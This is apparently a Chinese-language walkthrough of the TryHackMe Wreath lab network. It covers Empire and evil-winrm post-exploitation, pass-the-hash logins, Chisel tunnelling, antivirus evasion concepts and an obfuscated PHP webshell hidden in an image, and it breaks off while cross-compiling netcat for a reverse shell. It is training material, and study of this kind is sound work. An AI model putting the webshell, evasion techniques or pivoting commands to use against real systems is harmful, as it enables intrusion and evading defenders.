+<h1 id="Empire-Interactive-Shell"><a href="#Empire-Interactive-Shell" class="headerlink" title="Empire: Interactive Shell"></a>Empire: Interactive Shell</h1><p>交互式 shell 是 Empire 4.0 中的一项新功能。它有效地允许您从 Starkiller 或 Empire CLI 客户端中访问传统的伪命令 shell。这可用于执行 PowerShell 命令，就像在 Powershell 反向 shell 中一样。</p>
+<p>要访问 Empire CLI 客户端中的交互式 shell，我们可以在代理上下文中使用“shell”命令：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/a864fce42efc.png" alt="Demonstration of using the shell command to drop into an interactive shell in the Empire Client CLI"></p>
+<p>在 Starkiller 中，这甚至更容易，因为可以在 Agent 交互界面中直接找到 shell：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/c1b8fc62f751.png" alt="img"></p>
+<p>虽然不像命令行 shell 那么“熟悉”，但它为我们提供了完全相同的访问权限。</p>
+<h1 id="Conclusion-1"><a href="#Conclusion-1" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>我们现在已经介绍了使用命令和控制框架的基础知识。Empire 比我们在此处介绍的基础知识要广泛得多，因此非常值得您在自己的时间里对其进行更多研究！</p>
+<p>本节的主要内容是：</p>
+<ul>
+<li>C2 框架用于整合对受感染机器的访问，以及简化后利用尝试</li>
+<li>有许多可用的 C2 框架，因此请查看哪些最适合您的用例</li>
+<li>Empire 是一个不错的选择，因为它是一个相对全面的开源 C2 框架</li>
+<li>Empire 仍在积极开发中，升级和新功能经常发布</li>
+<li>Starkiller 是 Empire 的 GUI 前端，使使用该框架进行协作变得非常容易</li>
+</ul>
+<p>这是对 Empire 框架和一般主题的一次短暂介绍，但希望它仍然有用。</p>
+<h1 id="Enumeration-3"><a href="#Enumeration-3" class="headerlink" title="Enumeration"></a>Enumeration</h1><p>我们很快将进入该网络的最后一个教学点：反病毒规避技术。</p>
+<p>但是，在这样做之前，我们首先需要确定最终目标！</p>
+<p>我们从简报中得知，这个目标很可能是网络上的另一台 Windows 机器。通过排除法，我们可以知道这是 Thomas 的 PC，他告诉我们安装了防病毒软件。如果我们非常幸运，那么它应该是过期的！</p>
+<p>与往常一样，我们需要先枚举目标，然后才能执行其他任何操作，但是我们如何从受感染的 Windows 主机执行此操作？正如在 Pivoting Enumeration 任务中提到的那样，除非在目标上正确安装了 Nmap，否则它将无法在 Windows 上工作。通过一个代理进行扫描很糟糕，但此时我们将通过 <em>两个</em> 代理进行扫描，这将是无法忍受的。我们可以编写一个工具来为我们完成此操作，但让我们暂时不讨论这个问题（接下来的部分将有足够多的代码！）。相反，让我们更深入地了解情况，并提出一个迫切的问题：</p>
+<p><strong>Empire 模块如何工作？</strong></p>
+<p>大多数 Empire 模块实际上只是框架通过活动代理执行的脚本（通常在 PowerShell 中）。换句话说，这些只是 PowerShell 脚本，我们可以通过 PowerShell 访问目标。</p>
+<p>为了学习，让我们上传 Empire 端口扫描脚本并在目标上手动执行它。</p>
+<hr>
+<p>在我们当前的情况下（在一个孤立的目标上，通过跳转服务器进行通信），在正常情况下，手动上传工具通常是一件苦差事——想想中继和网络服务器。幸运的是，evil-winrm 为我们提供了几种简单的传输和包含工具的选项。</p>
+<p><strong>上传/下载：</strong><br>我们可以使用的第一个选项是内置在工具中的内置上传/下载功能。在 evil-winrm 中，我们可以使用“上传 LOCAL_FILEPATH REMOTE_FILEPATH”将文件上传到目标。相反，我们可以使用“下载 REMOTE_FILEPATH LOCAL_FILEPATH”从目标下载回文件。如果我们想将工具上传到目标，将运行结果保存到日志文件，然后将日志文件下载回我们的攻击机器进行存储，这些可能会派上用场。在这两种情况下，如果我们错过了目标文件路径（例如，上传时的远程文件路径，或下载时的本地文件路径），该工具将被上传到我们当前的工作目录中。</p>
+<p>For example:<br><img src="https://assets.tryhackme.com/additional/wreath-network/e02003103ad1.png" alt="Demonstrating a file upload in Evil-WinRM using nc.exe as an example"></p>
+<p>在这个例子中，我们将一个示例工具（<code>nc.exe</code>）上传到<code>C:\Windows\Temp</code>，然后创建一个新文件（<code>demo.txt</code>）并将其下载到当前工作目录。请注意，在现实世界中使用<code>C:\Windows\Temp</code>目录通常是一个坏主意，因为它被标记为黑客上传工具的常用位置。在这种情况下，我们使用它来为其他用户保持盒子整洁。</p>
+<p><strong>本地脚本：</strong><br>上传工具很好，但如果该工具恰好是PowerShell脚本，那么还有另一种（更方便的）方法。如果您查看 evil-winrm 的帮助菜单，您将看到一个有趣的<code>-s</code>选项。这允许我们指定一个包含 PowerShell 脚本的本地目录——这些脚本将可供我们访问，以便我们使用 evil-winrm 会话直接将其导入内存（这意味着它们根本不需要接触磁盘）。例如，如果我们的脚本恰好位于“/opt/scripts”，我们可以将它们包含在以下连接中：<br><code>evil-winrm -u USERNAME -p PASSWORD -i IP -s /opt/scripts</code></p>
+<p>让我们使用此选项来包含 Empire Portscan 模块。</p>
+<p>如果您按照建议使用 apt 安装，则 Empire 脚本存储在 <code>/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/</code> 中。此工具的副本也包含在任务 1 附带的 zip 文件中，或者如果您在本地找不到它，可以从 <a target="_blank" rel="noopener" href="https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/Invoke-Portscan.ps1">此处</a> 下载。</p>
+<p>无论如何，我们现在可以使用之前发现的密码哈希以管理员身份登录，包括 Empire 网络扫描脚本：<br><code>evil-winrm -u Administrator -H HASH -i IP -s EMPIRE_DIR</code></p>
+<p>输入 <code>Invoke-Portscan.ps1</code> 并按 Enter 初始化脚本。</p>
+<p>现在，如果我们输入“Get-Help Invoke-Portscan”，我们应该会看到该工具的帮助菜单，而无需手动导入或上传任何内容！</p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/67448956442a.png" alt="Demonstrating the Get-Help cmdlet for the imported function"></p>
+<hr>
+<p>Empire Portscan 模块在语法方面与 Nmap 类似。我们建议您通读该工具的完整帮助菜单；但是，我们只需要两个开关：“-Hosts”和“-TopPorts”。我们<em>可以</em>使用“-Ports”开关并只扫描一系列端口，但为了提高速度，我们可以使用 -TopPorts 开关扫描用户指定数量的最常打开的端口。例如，“-TopPorts 50”将扫描 50 个最常打开的端口。</p>
+<p>完整命令将如下所示（使用前 50 个端口和我们的示例 172.16.0.10）：<br><code>Invoke-Portscan -Hosts 172.16.0.10 -TopPorts 50</code></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/桌面]</span><br><span class="line">└─$ evil-winrm -i 10.200.219.150 -u 'mikannse' -p '1q2w3e!' -s /tmp/scripts</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\mikannse\Documents&gt; Invoke-Portscan.ps1</span><br><span class="line">*Evil-WinRM* PS C:\Users\mikannse\Documents&gt; Invoke-Portscan -Hosts 10.200.219.100 -TopPorts 50</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Hostname      : 10.200.219.100</span><br><span class="line">alive         : True</span><br><span class="line">openPorts     : {80, 3389}</span><br><span class="line">closedPorts   : {}</span><br><span class="line">filteredPorts : {445, 443, 6001, 81...}</span><br><span class="line">finishTime    : 8/22/2024 5:20:13 AM</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h1 id="Pivoting-1"><a href="#Pivoting-1" class="headerlink" title="Pivoting"></a>Pivoting</h1><p>我们在上一个任务中发现两个端口是开放的。如果没有凭证（或者至少没有哈希，尽管传递哈希攻击通常通过 RDP 受到限制），RDP 对我们来说没什么用；但是，Web 服务器值得研究。Wreath 告诉我们，他使用自己 PC 上的本地环境来开发他的网站，因此这个前沿版本可能包含一些漏洞，我们可以利用这些漏洞来利用目标。然而，在我们这样做之前，我们必须弄清楚如何从我们的攻击机器访问 Wreath PC 上的开发 Web 服务器。</p>
+<p>我们有两个直接的选择：Chisel 和 Plink。</p>
+<p>使用chisel进行代理，先开启一个防火墙出口,但是需要管理员身份，使用之前拿到的hash进行传递</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/桌面]</span><br><span class="line">└─$ evil-winrm -i 10.200.219.150 -u 'administrator' -H '37db630168e5f82aafa8461e05c6bbd1' -s /tmp/scripts</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                     </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; netsh advfirewall firewall add rule name="Chisel-mikann" dir=in action=allow protocol=tcp localport=50000</span><br><span class="line">Ok.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后打算将.200上的50000端口转发到.100上的80端口web服务器</p>
+<p>在.200上面开启一个chisel服务器</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[root@prod-serv ~]# firewall-cmd --zone=public --add-port 50000/tcp</span><br><span class="line">success</span><br><span class="line">[root@prod-serv tmp]# firewall-cmd --zone=public --add-port 25000/tcp</span><br><span class="line">success</span><br><span class="line">[root@prod-serv tmp]# ./chisel server -p 25000 --reverse</span><br><span class="line">2024/08/22 07:11:27 server: Reverse tunnelling enabled</span><br><span class="line">2024/08/22 07:11:27 server: Fingerprint Wm9FdCj5yMbXoJ/idwH53PNtHGrlYd69a5rvHy0FVJE=</span><br><span class="line">2024/08/22 07:11:27 server: Listening on http://0.0.0.0:25000</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在.150上开启50000端口防火墙和chisel客户端反向连接</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; netsh advfirewall firewall add rule name="Chisel-mikann" dir=in action=allow protocol=tcp localport=50000</span><br><span class="line">Ok.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Windows\temp&gt; ./chisel.exe client 10.200.219.200:25000 R:50000:10.200.219.100:80</span><br><span class="line">chisel.exe : 2024/08/22 07:16:27 client: Connecting to ws://10.200.219.200:25000</span><br><span class="line">    + CategoryInfo          : NotSpecified: (2024/08/22 07:1...0.219.200:25000:String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">2024/08/22 07:16:27 client: Connected (Latency 607.1Âµs)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>访问.200的50000端口，是一个tomas的个人页面</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/桌面]</span><br><span class="line">└─$ nmap -sT -sV -sC -p50000 10.200.219.200                            </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-22 06:25 UTC</span><br><span class="line">Nmap scan report for thomaswreath.thm (10.200.219.200)</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">50000/tcp open  http    Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)</span><br><span class="line">| http-git: </span><br><span class="line">|   10.200.219.200:50000/.git/</span><br><span class="line">|     Git repository found!</span><br><span class="line">|     Repository description: Unnamed repository; edit this file 'description' to name the...</span><br><span class="line">|     Last commit message: Initial Commit for the back-end # Please enter the commit me...</span><br><span class="line">|     Remotes:</span><br><span class="line">|_      http://192.168.1.172/Website.git</span><br><span class="line">|_http-title: Thomas Wreath | Developer</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 38.68 seconds</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h1 id="The-Wonders-of-Git"><a href="#The-Wonders-of-Git" class="headerlink" title="The Wonders of Git"></a>The Wonders of Git</h1><p>看来我们猜对了！它似乎是在网络服务器上运行的网站的副本。如果这里有任何差异，那么它们显然不会立即可见，这意味着我们可能需要通过两个代理来模糊测试这个网站…</p>
+<p>不过，在我们开始摆弄模糊测试工具之前，让我们退一步思考一下。</p>
+<p>我们从简介中知道，Thomas 一直在使用 git 服务器来控制他的项目的版本——仅仅因为网络服务器上的版本不是最新的，并不意味着他没有更频繁地提交到 repo！换句话说，我们可能不必模糊测试服务器，只需下载网站的源代码并在本地查看即可。</p>
+<p>理想情况下，我们可以直接从服务器克隆 repo。这可能需要凭据，我们需要找到它。或者，鉴于我们已经拥有对 git 服务器的本地管理员访问权限，我们可以从硬盘下载存储库并在本地重新组装它，这不需要任何（进一步的）身份验证。</p>
+<p>为了练习，我们使用后一个选项。</p>
+<h1 id="Website-Code-Analysis"><a href="#Website-Code-Analysis" class="headerlink" title="Website Code Analysis"></a>Website Code Analysis</h1><p>进入 <code>NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3/</code> 目录。</p>
+<p><code>index.html</code> 文件没有什么用处——实际上我们需要一些 PHP，我们在任务 31 中将其确定为 Web 服务器的后端语言。</p>
+<p>让我们使用 <code>find</code> 查找 PHP 文件：<br><code>find . -name "*.php"</code></p>
+<p>只有一个结果：<br><code>./resources/index.php</code><br><img src="https://assets.tryhackme.com/additional/wreath-network/1eba548b724f.png" alt="Demonstration of finding the PHP file"></p>
+<p>如果我们要找到一个严重的漏洞，它就一定在这里！</p>
+<h1 id="Exploit-PoC"><a href="#Exploit-PoC" class="headerlink" title="Exploit PoC"></a>Exploit PoC</h1><p>好的，我们知道访问此页面时可能会发生什么：</p>
+<ul>
+<li>它可能会要求我们提供凭据</li>
+<li>我们将能够上传图像文件</li>
+<li>有两个过滤器可以阻止我们上传其他类型的文件</li>
+<li>这两个过滤器都可以绕过</li>
+</ul>
+<p>完美 - 让我们访问该页面！</p>
+<h1 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h1><p>反病毒逃避是 Wreath 网络的第三个也是最后一个主要教学点。</p>
+<p>从本质上讲，反病毒逃避是一个快速变化的话题。这是黑客和开发人员之间不断进行的一场舞蹈。每当开发人员发布一项新功能时，黑客就会开发出一种绕过它的方法。每当黑客绕过一项新功能时，开发人员就会发布另一项功能来关闭漏洞，如此循环往复。由于这个过程的速度非常快，几乎不可能教授前沿技术（并期望它们在任何时间内保持相关性），所以我们在这里只介绍该主题的基础知识。事不宜迟，让我们开始吧！</p>
+<hr>
+<p>说到反病毒逃避，我们有两种主要类型：</p>
+<ul>
+<li>磁盘逃避</li>
+<li>内存逃避</li>
+</ul>
+<p>磁盘逃避是指我们尝试将文件（无论是工具、脚本还是其他）保存在目标上，然后执行。这在使用可执行文件（<code>.exe</code>）时非常常见。</p>
+<p>内存规避是指我们尝试将脚本直接导入内存并在那里执行。例如，这可能意味着从互联网或我们自己的设备下载 PowerShell 模块并直接导入它而不将其保存到磁盘。</p>
+<p>在过去，内存规避足以绕过大多数 AV 解决方案，因为大多数防病毒软件无法扫描存储在正在运行的进程内存中的脚本。不过，这种情况已不复存在，因为微软实施了一项名为 反恶意软件安全接口 (AMSI) 的功能。AMSI 本质上是 Windows 的一项功能，可在脚本进入内存时对其进行扫描。它实际上并不检查脚本本身，但它确实为 AV 发布者提供了钩子——本质上允许现有的防病毒软件获取正在执行的脚本的副本，对其进行扫描，并决定是否可以安全执行。虽然有各种绕过方法（通常涉及欺骗 AMSI 导致无法加载），但这些方法超出了本讨论的范围。</p>
+<p>就方法论而言：理想情况下，我们首先尝试对目标上的 AV 进行指纹识别，以了解我们面临的解决方案。由于这通常是一个交互式（依赖于社会工程）过程，我们现在将跳过它并假设目标正在运行默认的 Windows Defender，以便我们可以直接进入主题的核心。如果我们已经在目标上有一个 shell，我们还可以使用 <a target="_blank" rel="noopener" href="https://github.com/PwnDexter/SharpEDRChecker">SharpEDRChecker</a> 和 <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">Seatbelt</a> 等程序来识别安装的防病毒解决方案。一旦我们知道目标的操作系统版本和 AV，我们就会尝试在虚拟机中复制此环境，我们可以使用它来测试有效载荷。请注意，我们应该<em>始终</em>在 AV 设置中禁用任何类型的基于云的保护（可能通过彻底断开虚拟机与互联网的连接），这样 AV 就不会将我们精心制作的有效载荷上传到某个服务器进行分析，从而破坏我们所有的辛勤工作。一旦我们有了有效的有效载荷，我们就可以将其部署到目标上！</p>
+<p>AV 规避通常涉及有效载荷的某种形式的混淆。这可能意味着从在漏洞中移动内容和更改变量名称，到对脚本进行编码，再到彻底加密有效载荷并编写包装器以逐段解密和执行代码。目的是切换足够多的内容，使 AV 软件无法检测到任何不良内容。</p>
+<h1 id="AV-Detection-Methods"><a href="#AV-Detection-Methods" class="headerlink" title="AV Detection Methods"></a>AV Detection Methods</h1><p>在讨论实际问题之前，我们先来谈谈防病毒软件采用的不同检测方法。</p>
+<p>一般来说，检测方法可分为两类：</p>
+<ul>
+<li>静态检测</li>
+<li>动态/启发式/行为检测</li>
+</ul>
+<p>现代防病毒软件通常依赖于这些方法的组合。</p>
+<hr>
+<p>静态检测方法通常涉及某种签名检测。例如，一个非常基本的系统会获取可疑文件的哈希值并将其与已知恶意软件哈希值的数据库进行比较。该系统确实倾向于使用；但是，它永远不会在现代防病毒解决方案中单独使用。因此，在处理已知漏洞时，更改<em>某些内容</em>通常是一个好主意。对文件的最小更改将导致完全不同的哈希值，因此即使是更改帮助消息中的字符串这样小的事情也足以绕过这种基本的检测系统。</p>
+<p>幸运的是（或者对于我们黑客来说不幸的是），这通常远远不足以绕过静态检测方法。</p>
+<p>另一种静态检测形式经常用于防病毒软件（效果更好），是一种称为字节（或字符串）匹配的技术。字节匹配是另一种签名检测形式，其工作方式是搜索程序以将字节序列与已知的坏字节序列数据库进行匹配。这比仅对整个文件进行哈希处理要有效得多！当然，这也意味着我们（作为黑客）要更努力地追踪负责该标志的确切代码行。</p>
+<p>当然，这种方法的代价是速度。与对整个文件进行哈希处理并将哈希与数据库进行比较所需的毫秒相比，针对具有多个库的潜在庞大程序检查小字节序列可能需要相对较长的时间。因此，有时会做出妥协，即 AV 程序对文件的小部分进行哈希处理以与数据库进行检查，而不是对整个文件进行哈希处理。这显然降低了该技术的有效性，但确实在一定程度上提高了速度。</p>
+<hr>
+<p>静态病毒恶意软件检测方法查看文件本身，而动态方法查看文件的<em>行为</em>。有几种方法可以做到这一点。</p>
+<ol>
+<li>AV 软件可以逐行检查可执行文件，检查执行流程。根据关于哪种类型的操作是恶意的<em>预定义规则</em>（例如，程序是否访问已知的恶意网站，或是否在注册表中乱码？），AV 可以看到程序<em>打算</em>如何操作，并做出相应的决定</li>
+<li>可疑软件可以在 AV 软件的密切监督下在沙盒环境中直接执行。如果程序行为恶意，则会被隔离并标记为恶意软件</li>
+</ol>
+<p>逃避这些措施仍然是完全可能的，尽管比逃避静态检测技术要困难得多。沙盒往往相对独特，因此我们只需要查找各种系统值（例如，是否安装了风扇，是否有 GUI，如果有，分辨率是多少，是否有任何独特的工具或服务正在运行——例如 VMware 虚拟机的“VMtools”）并检查是否有任何危险信号。例如，没有风扇、没有 GUI 且运行经典 VM 服务的机器很可能是沙盒——在这种情况下，程序应该退出。如果程序退出时没有执行任何恶意操作，那么 AV 软件就会被欺骗，认为它是安全的，并允许它在目标上执行。</p>
+<p>同样，通过逻辑流分析，AV 软件仍然只使用一组规则来检查恶意行为。如果恶意软件的行为方式出乎意料（例如，在漏洞利用中插入了一些随机代码，但这些代码什么都不做），那么它很可能通过这种检测方法。</p>
+<p>除此之外，在使用某些类型的交付方法时，使用密码保护文件可以直接绕过行为分析检查，因为（与知道密码的用户不同）AV 软件无法打开和执行文件。</p>
+<p>话虽如此，动态检测方法通常比静态方法有效得多。缺点是，再次启动 VM 来分析文件或逐行检查文件以查看它是否在执行任何恶意操作所需的时间和资源。这些操作需要时间（导致用户变得不耐烦），并且会占用大量计算机可用资源。AV 再次不得不妥协，在扫描文件时使用动态和静态分析的组合。</p>
+<hr>
+<p>更糟糕的是，防病毒供应商通常彼此保持密切联系——以及与 <a target="_blank" rel="noopener" href="https://www.virustotal.com/">VirusTotal</a> 等扫描网站保持密切联系。当 AV 检测到可疑文件时，它通常会将文件发送回提供商拥有的服务器，在那里进行分析并与其他提供商共享。这意味着一旦我们的有效载荷在一台计算机上被检测到，它很可能会很快被拆开并屏蔽。这种快速的信息共享使 AV 提供商能够领先于坏人（这是一件好事），但显然也给我们作为道德黑客的工作增加了额外的复杂性。</p>
+<p>此外，新技术一直在开发中。例如，人们正在尝试使用机器学习技术来动态更新沙盒环境中的不良行为列表，或用于可疑文件的逻辑流分析的规则列表。如果您对该领域的一些工作感兴趣，TryHackMe 自己的 <a target="_blank" rel="noopener" href="https://cmnatic.co.uk/">CMNatic</a> 就该主题撰写了他的论文，可以在 <a target="_blank" rel="noopener" href="https://resources.cmnatic.co.uk/Presentations/Dissertation/">此处</a> 阅读。</p>
+<h1 id="PHP-Payload-Obfuscation"><a href="#PHP-Payload-Obfuscation" class="headerlink" title="PHP Payload Obfuscation"></a>PHP Payload Obfuscation</h1><p>现在我们已经了解了基本术语，让我们回到黑客攻击这台电脑上！</p>
+<p>我们有一个上传点，可以用来上传 PHP 脚本。我们现在需要弄清楚如何制作一个可以绕过防病毒软件的 PHP 脚本。Windows Defender 是免费的，并且预装在 Windows Server 中，所以我们假设这是目前使用的。</p>
+<p>解决方案是这样的：<br>我们构建一个可以执行我们需要它做的事情的有效载荷（最好以一种不太常见的方式），然后我们手动或使用网上提供的众多工具之一对其进行混淆。</p>
+<p>首先，让我们构建该有效载荷：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $cmd = $_GET["wreath"];</span><br><span class="line">    if(isset($cmd)){</span><br><span class="line">        echo "&lt;pre&gt;" . shell_exec($cmd) . "&lt;/pre&gt;";</span><br><span class="line">    }</span><br><span class="line">    die();</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在这里，我们检查是否已设置名为“wreath”的 GET 参数。如果已设置，我们使用 <code>shell_exec()</code> 执行它，将其包裹在 HTML <code>&lt;pre&gt;</code> 标签内，以便提供干净的输出。然后我们使用 <code>die()</code> 来防止图像的其余部分在屏幕上显示为乱码文本。</p>
+<p>这比经典的 PHP 单行 webshell（<code>&lt;?php system($_GET["cmd"]);?&gt;</code>）略长，原因有二：</p>
+<ol>
+<li><p>如果我们对其进行混淆，那么它无论如何都会变成一行</p>
+</li>
+<li><p>当涉及到 AV 规避时，任何<em>不同</em>的东西都是好的</p>
+</li>
+</ol>
+<p>我们现在需要混淆这个有效载荷。</p>
+<p>我们可以采取多种措施，包括但不限于：</p>
+<ul>
+<li>切换漏洞利用的各个部分，使其处于不寻常的顺序</li>
+<li>对所有字符串进行编码，使其无法识别</li>
+<li>拆分代码的不同部分（例如 <code>shell_exec($_GET[...])</code>）</li>
+</ul>
+<p>回答以下问题</p>
+<p>手动混淆非常重要，但为了简单起见，我们只使用可用的在线工具之一。建议使用链接为 <a target="_blank" rel="noopener" href="https://www.gaijin.at/en/tools/php-obfuscator">此处</a> 的工具。在 Web 混淆方面，这些工具通常用于使代码难以被人类阅读；但是，通过执行诸如混淆变量/函数名称和编码字符串之类的操作，它们也证明对防病毒软件有效。</p>
+<p>将有效负载放入工具中，然后激活所有混淆选项：<br><img src="https://assets.tryhackme.com/additional/wreath-network/bb2ef4375625.png" alt="Obfuscator with the payload input and all options set"></p>
+<p>单击“混淆源代码”按钮，我们得到了一堆乱七八糟的 PHP：<br><code>&lt;?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?&gt;</code></p>
+<p>如果仔细观察，您会发现这仍然是与之前非常相同的有效载荷；但是，已经发生了足够多的变化，它<em>应该</em>可以欺骗 Defender。</p>
+<p>由于这会传递到 bash 命令中，我们需要转义美元符号，以防止它们被解释为 bash 变量。这意味着我们的最终有效载荷如下：<br><code>&lt;?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?&gt;</code></p>
+<p>随便找一张jpg图片,使用exiftool生成图片马</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">exiftool -Comment="&lt;?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?&gt;" shell-mikann.jpg.php</span><br></pre></td></tr></tbody></table></figure>
+
+<p>访问/resources,使用Thomas:i&lt;3ruby凭证登录,上传刚生成的webshell,上传到/resources/uploads,访问webshell,是wreath-pc\thomas身份</p>
+<h1 id="Compiling-Netcat-amp-Reverse-Shell"><a href="#Compiling-Netcat-amp-Reverse-Shell" class="headerlink" title="Compiling Netcat &amp; Reverse Shell!"></a>Compiling Netcat &amp; Reverse Shell!</h1><p>我们的 webshell 已经很好了，但让我们来获取一个完整的反向 shell！</p>
+<p>不幸的是，我们遇到了一个问题。与 Linux 不同，Linux 通常有很多方法可以获取反向 shell，而 Windows 中的选项要少得多，因为 Windows 往往不会默认安装许多脚本语言。</p>
+<p>实际上，我们有几个选择：</p>
+<ul>
+<li>Powershell 往往是 Windows 反向 shell 的首选。不幸的是，Defender 确切地知道 PowerShell 反向 shell 是什么样子，所以我们必须做一些严重的混淆才能让它工作。</li>
+<li>我们可以尝试获取 PHP 反向 shell，因为我们知道目标安装了 PHP 解释器。然而，Windows PHP 反向 shell 往往不太可靠，而且可能会触发 Defender。</li>
+<li>我们可以使用 msfvenom 生成可执行反向 shell，然后使用 webshell 上传并激活它。同样，msfvenom shell 往往非常独特。我们可以使用 <a target="_blank" rel="noopener" href="https://www.veil-framework.com/">Veil Framework</a> 来获得一个可以绕过 Defender 的 meterpreter shell 可执行文件，但让我们暂时保留这份手册。同样，<a target="_blank" rel="noopener" href="https://www.shellterproject.com/">shellter</a>（虽然很旧）也可以提供我们所需的功能。不过，还有更简单的选择。</li>
+<li>我们可以上传 netcat。这是一个快速简便的选择。</li>
+</ul>
+<p>上传 netcat 的唯一问题是，有数百种不同的变体——Kali 附带的 Windows 版 netcat 是 Defender 所熟知的，因此我们需要一个不同的版本。幸运的是，有很多版本可供选择！让我们使用 github 中的一个，<a target="_blank" rel="noopener" href="https://github.com/int0x33/nc.exe/">这里</a>。</p>
+<p>克隆存储库：<br><code>git clone https://github.com/int0x33/nc.exe/</code></p>
+<p>此存储库已包含针对 32 位和 64 位系统的预编译 netcat 二进制文件，但是，这是讨论交叉编译技术的理想时机。如果您只想使用默认二进制文件，则只需跳到此任务的最后一部分并使用存储库中的 <code>nc64.exe</code> 二进制文件。</p>
+<hr>
+<p>交叉编译是一项必不可少的技能——尽管在许多方面最好避免使用它。</p>
+<p>首先：什么是交叉编译？其理念是将源代码编译成可以在不同平台上运行的工作程序。换句话说，交叉编译允许我们为不同的 Linux 内核编译程序、Kali 上的 Windows 程序（就像我们在这里所做的那样），甚至为嵌入式设备或手机编译软件。</p>
+<p>虽然交叉编译是一项非常有用的技能，但通常很难完全正确。理想情况下，我们应该始终尝试在尽可能接近目标环境的环境中编译我们的代码。例如，如果漏洞或程序设计为在 CentOS 7.2 上运行，我们应该尽可能尝试在 CentOS 7.2 VM 中编译它。同样，我们必须获得与目标相同的 arch——64 位程序在 32 位目标上运行效果不佳！</p>
+<p>但有时最简单的方法是交叉编译。一般来说，我们使用 <code>mingw-w64</code> 包（适用于 x64 系统）在 Kali 上交叉编译 x64 Windows 程序。默认情况下，Kali 上未安装此包，但它在 Kali apt 存储库中可用：<br><code>sudo apt install mingw-w64</code></p>
+<p>这是一个很大的包，但一旦安装，我们就可以开始重新编译 netcat。</p>
+<p>就像我们使用 <code>gcc</code> 在 Linux 上编译二进制文件一样，我们可以使用 <code>mingw</code> 编译器来编译 Windows 二进制文件。这些编译器往往具有非常描述性（读作：长）的名称，但这里对我们来说特别重要的是 <code>x86_64-w64-mingw32-gcc</code>。这指定我们要编译 64 位二进制文件。</p>
+<p>在我们下载的 nc.exe 存储库中，删除或移动两个预编译的 netcat 二进制文件。存储库提供了一个 makefile，我们可以使用它（进行一些小改动）来编译二进制文件。使用您最喜欢的文本编辑器打开 <code>Makefile</code>。前两行指定要使用的编译器：<br><img src="https://assets.tryhackme.com/additional/wreath-network/499921a44689.png" alt="The first two lines of the Makefile at their default"></p>
+<p>这些都不是我们所寻找的，因此注释掉第一行并在下面添加另一行：<br><code>CC=x86_64-w64-mingw32-gcc</code><br><img src="https://assets.tryhackme.com/additional/wreath-network/d71f7f2fcb0e.png" alt="The first (now three) lines of the makefile after commenting out the first line and adding in the correct compiler on line three"></p>
